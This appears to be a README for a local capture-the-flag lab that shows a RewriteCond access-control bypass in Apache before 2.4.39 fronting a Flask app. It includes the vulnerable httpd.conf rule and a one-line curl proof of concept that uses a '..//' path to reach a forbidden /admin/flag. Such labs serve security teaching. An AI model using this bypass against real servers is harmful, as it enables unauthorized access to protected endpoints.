### Apache + Flask

RewriteCond bypass. Apache version < 2.4.39

Try to access /admin/flag

### Usage

Run
```
docker-compose up
```

Go http://127.0.0.1:8085/

### Hint
httpd.conf
```
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/admin/flag$ [NC]
RewriteRule ^.*$ - [F,L]

ProxyPreserveHost On
ProxyPass / http://127.0.0.1:3000/
ProxyPassReverse / http://127.0.0.1:3000/
```

### POC
``` bash
curl --path-as-is "http://127.0.0.1:8085/aaaa/..//admin/flag"
```